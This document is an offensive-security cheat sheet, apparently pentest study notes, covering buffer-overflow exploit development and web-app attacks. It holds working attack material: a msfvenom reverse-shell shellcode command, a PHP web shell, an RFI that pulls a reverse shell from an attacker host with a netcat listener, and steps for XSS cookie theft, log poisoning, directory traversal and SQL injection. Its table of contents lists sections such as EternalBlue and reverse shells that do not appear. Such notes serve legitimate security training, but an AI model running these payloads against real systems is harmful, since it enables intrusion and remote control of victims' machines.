# Gaining Access
## Table of Contents
* [MS09-050: SMBv2 Command Value Vulnerability](#ms09-050-smbv2-command-value-vulnerability)
  * [CVE-2009-3103](#cve-2009-2532)
* [EternalBlue](#eternalblue)
  * [CVE-2017-0144](#cve-2017-0144)
* [SambaCry](#sambacry)
  * [CVE-2017-7494](#cve-2017-7494)
* [ShellShock](#shellshock)
  * [CVE-2014-6271](#cve-2014-6271)
* [Juicy Potato](#juicy-potato)
* [Shell via Samba Logon Command](#shell-via-samba-logon-command)
* [Online](#online)
  * [Hydra](#hydra)
  * [Crowbar](#crowbar)
* [Offline](#offline)
  * [Hashcat](#hashcat)
  * [John the Ripper](#john-the-ripper)
* [Bind Shells](#bind-shells)
  * [Python](#python-bind-shell)
* [Reverse Shells](#reverse-shells)
  * [BASH](#bash-reverse-shells) 
  * [Msfvenom](#msfvenom-reverse-shells)
  * [Netcat](#netcat-reverse-shells)
  * [PowerShell](#powershell-reverse-shells)
  * [Python](#python-reverse-shells)
  * [JavaScript](#javascript-reverse-shells)
* [Upgrade to a PTY Shell](#upgrade-to-a-pty-shell)
  * [Python PTY Shell](#python-pty-shell) 
* [Macros](#macros)  
  * [How to Add a Macro to a Microsoft Word Document](#how-to-add-a-macro-to-a-microsoft-word-document)
  * [Example Macro](#example-macro)
  * [Example Macro Syntax Explained](#example-macro-syntax-explained)
  * [VBScript, CScript, and WScript](#vbscript-cscript-and-wscript)

## Generating a String of Non-Repeating Characters
```bash
msf-pattern_create -l 1000 # print a string of 1000 non-repeating characters
msf-pattern_create -l 1000 -q 12345678 # get the number of bytes required to get to this offset
```

## Finding Opcodes
```bash
msf-nasm_shell # invoke msf-nasm_shell
jmp esp # give it an assembly instruction

# output
00000000 FFE4 jmp esp # the second column is the opcode that corresponds with your instruction
```

## Immunity Debugger
### Panes 
The default panes loaded when Immunity Debugger is started are listed below (going clock-wise starting with the top-left). To restore the panes to their default layout, click-on: Windows > 8 CPU. FYI, these panes belong to a single window called, "CPU." If additional windows are opened after the fact (ex: Log data) just close everything except for the CPU window. 
1. Disassembly
2. Registers
3. Dump
4. Stack

## Searching a Binary or DLL for Specific Assembly Instructions
Using Immunity Debugger
```bash
!mona find -s “\xff\xe4” -m “foo.dll” # search for “jmp esp” instruction
```

## Generating Shellcode
```bash
msfvenom -l payloads # list all payload options

# -p = payload: reverse shell
# EXITFUNC=thread = exit the thread (not process); avoids app crash
# -e = encode: to match target environment
# -b = bad characters: ASCII stuff (null, LF, CR, %, &, +, =)
# -f = (output) format: C 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 EXITFUNC=thread \
-e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f c 

# output 
unsigned char buf[] =
"\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"

# using the above shellcode in a Python script
shell = (
    "\xbe\x55\xe5\xb6\x02\xda\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
    "\x52\x31\x72\x12\x03\x72\x12\x83\x97\xe1\x54\xf7\xeb\x02\x1a"
)
```

# Cheatsheet - Buffer Overflows (BOF)
## Immunity Debugger
```bash
File > Open # open a program for debugging; provide file name & arguments
Debug > Step into # follow the execution flow of a function
Debug > Step over # execute a function and return from it
```

How to find and proceed to the Main function of a program.
```bash
- [Right-click Assembly pane] > Search for > All referenced text strings
- Double-click on the correct result (and return to the Assembly pane)
- Highlight the text of interest (ex: strcpy) & press F2 (set a breakpoint)
- Debug > Run (execution will stop just before your breakpoint)
- Debug > Step into # watch program execution "frame by frame"
```

How to reset the view to the original layout (instruction, registers, memory, and stack panes). 
```bash
# option 1
View > CPU # then, maximize the CPU window

# option 2
ALT + c # then, maximize the CPU window
```

### Mona.py
Set the current working directory to be where the program (i.e. %p) being debugged is located. 
```bash
!mona config -set workingfolder c:\mona\%p
```

Toggle between command history.
```bash
# ESC + <arrow>
```

#### Controlling the EIP Register
Find all instances of a Metasploit Pattern (hence "msp"). The example below will search 2400 bytes from the ESP register (the default is to search the entire Stack Frame). The alternative to this is manually looking at the EIP register in the Registers pane (in the CPU window). Pay attention the offset value (this represents where EIP is in the BOF you sent; if you know this value, you know exactly where in your BOF you need to place the Return Address that will point to your shellcode). For example, if the example output below means you must place your desired Return Address 1978 bytes into your BOF in order for it to accuratey land in the EIP register. 
```bash
!mona findmsp -distance 2400

# example output
[+] Examining registers
    EIP contains normal pattern : 0x6f43396e (offset 1978)
```

### Generate a Byte Array of Bad Characters
This step is important for knowing what characters will prevent our shellcode from working. 
```bash
!mona bytearray -b "\x00"
```

```python
payload = ''
for x in range(1, 256):
  payload += "\\x" + "{:02x}".format(x)
```

Always re-copy the address. It will change as you remove bad characters from your BOF. 
```bash
!mona compare -f C:\mona\bytearray.bin -a <address>
```

### Find a JMP Instruction
```bash
!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
```

## Basic PHP Read-Eval-Print-Loop
```bash
vim demo.php
```
```php
<?php
  $output = shell_exec('ls -lart');
  echo "<pre>$output</pre>";
?>
```
```bash
php demo.php # <pre> tags become necessary when the code is executed by a web server and rendered by browser

# output
<pre>total 48
drwxr-xr-x   8 root    admin   256 Apr 24 20:56 ..
drwxr-xr-x+  4 Victor  staff   128 Apr 24 20:56 Public
drwx------+  3 Victor  staff    96 Apr 24 20:56 Documents
drwx------+  3 Victor  staff    96 Apr 24 20:56 Desktop
drwx------+  4 Victor  staff   128 Apr 24 20:58 Movies
drwx------+  4 Victor  staff   128 Apr 24 21:00 Pictures
drwx------+  4 Victor  staff   128 Apr 24 21:05 Music
drwx------+  5 Victor  staff   160 Apr 24 21:10 Downloads
drwx------@ 60 Victor  staff  1920 Apr 24 22:21 Library
-rw-r--r--   1 Victor  staff    74 Apr 26 15:17 demo.php
drwxr-xr-x+ 15 Victor  staff   480 Apr 26 15:17 .
</pre>
```

## Serving Up a PHP Reverse Shell for an RFI
Perform the steps below on the attacker side. 
```bash
vim reverse-shell.php
```
```php
<?php 
  echo shell_exec($_GET['cmd']); # replace this line with a reverse shell from /usr/share/webshells
?>
```
```python
sudo nc -nvlp 5050 # terminal 1
sudo python3 -m http.server 80 # terminal 2
```
```bash
# prerequisite: you must know the 'file' parameter is valid and will be referenced by
# an 'include' statement in the targeted web app's PHP code (other parameter examples: page, cmd, etc.)
firefox http://victim.edu/index.php?file=http://hacker.edu/reverse-shell.php
```

# Mind Map - Web Apps
## Enumerate 
* Enumerate the following before attempting to exploit a web app:
  * Programming language and/or web development framework in use
  * Web server software in use
  * Database software in use
  * Server operating system in use
* URLs
  * Filetype extensions (don't forget, modern web apps might use routes instead)
* Web Page Source Code
  * Comments
  * Hidden form fields
* Response Headers
  * Server header
  * "X-" headers
* Site Maps
  * robots.txt
  * sitemap.xml
* Admin Consoles
  * MySQL
    * Tomcat:
      * Path: /manager/html
    * phpMyAdmin:
      * Path: /phpmyadmin
      * Configuration file: config.inc.php

## Exploit
* Admin Consoles
  * Attempt to login using default credentials
  * Attempt to login using credentials found elsewhere (shares: SMB, NFS, etc.)
  * Use Burp Proxy to confirm which parameters are required to submit a valid HTTP request (cookie, session, password, token, etc.)
  * Use Burp Intruder to set the parameters required to submit a valid HTTP request
* XSS
  * Check if special characters are sanitized: <, >, {, }, ', ", ;
  * Check if HTML encoded special characters are sanitized  
  * Check if URL (Percent) encoded special characters are sanitized
  * Attempt a XSS attack 
    * Redirect a victim to a staged, information gathering script (HTML iframes)
    * Steal cookies and use them to negate having to authenticate to an Admin Console (JavaScript)
* Directory Traversal
  * Find references to files and change the value to something else. 
  * Look for file extensions in URLs. 
  * If you find a viable attack vector, try files accessible by all users (try the paths using encoding too; consider null characters to terminate file paths on older versions of PHP).
    * Windows:
      * C:\boot.ini
      * C:\Windows\System32\Drivers\etc\hosts
    * Linux:
      * /etc/passwd 
  * If you're able to access the web app's configuration files (ex: php.ini), you might be able to find credentials or determine if File Inclusions are allowed. 
    * Variables to check in the php.ini configuration file. 
      * register_globals: ???
      * allow_url: on 
* File Inclusions
  * Use the same techniques for identifying Directory Traversal vulnerabilities to find LFIs. 
  * For RFIs, try different ports to ensure firewalls are not a problem (ex: index.php?file=http://evil.com:443). 
  * For RFIs, try null characters to terminate file paths (necessary when dealing with older versions of PHP).
  * For RFIs, try ending your RFI paylods with ? so they're digested as part of the query string by the web server. 
  * If you can't upload files to perform an LFI, try log poisoning. You need to know the following:
    * File path for HTTP access log
        * /var/log/apache/access.log
        * /var/log/apache2/access.log
        * /var/log/httpd/access.log
    * Parameter to use (ex: file=, page=, cmd=)
  * For LFIs, try PHP protocol wrappers (file=data:text/plain,<php? echo 'foo' ?>)
* SQL Injection
  * Identify attack vectors and enumerate the underlying technology stack using single-quotes (single-quotes to delimit SQL strings)
  * Enumerate column count of immediate table using ORDER BY statements
  * Enumerate table names using UNION statements
  * Enumerate column names of interesting tables using UNION statements